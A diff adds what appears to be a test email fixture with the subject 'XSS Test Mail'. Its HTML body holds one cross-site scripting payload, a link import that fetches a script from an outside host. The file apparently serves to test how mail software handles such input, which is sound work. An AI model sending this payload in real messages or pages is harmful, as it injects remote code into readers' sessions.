@@ -1,0 +1,7 @@
+From: marcia_aronoff@environmentaldefense.org
+To: RW.txt@dogma.slashnull.org, 0913.10.TXT@dogma.slashnull.org,
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
